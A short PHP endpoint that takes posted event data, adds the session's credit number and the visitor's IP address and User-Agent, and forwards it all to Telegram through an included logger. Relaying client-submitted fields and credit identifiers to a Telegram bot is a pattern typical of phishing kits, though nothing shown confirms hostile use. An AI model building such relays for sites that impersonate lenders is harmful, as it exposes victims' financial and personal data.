<?php
session_start();
require_once __DIR__ . '/includes/telegram-logger.php';

header('Content-Type: application/json; charset=utf-8');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['ok' => false]);
    exit;
}

$raw     = file_get_contents('php://input');
$payload = json_decode($raw, true);
if (!is_array($payload)) {
    $payload = $_POST;
}

$event  = isset($payload['event']) ? (string) $payload['event'] : 'Evento';
$fields = isset($payload['data']) && is_array($payload['data']) ? $payload['data'] : [];

// contexto de sesión, si existe, para poder rastrear el evento hasta un crédito concreto
if (!empty($_SESSION['creditNumber'])) {
    $fields['Crédito (sesión)'] = $_SESSION['creditNumber'];
}
$fields['IP']         = $_SERVER['REMOTE_ADDR'] ?? null;
$fields['User-Agent'] = $_SERVER['HTTP_USER_AGENT'] ?? null;

telegram_log($event, $fields);

echo json_encode(['ok' => true]);
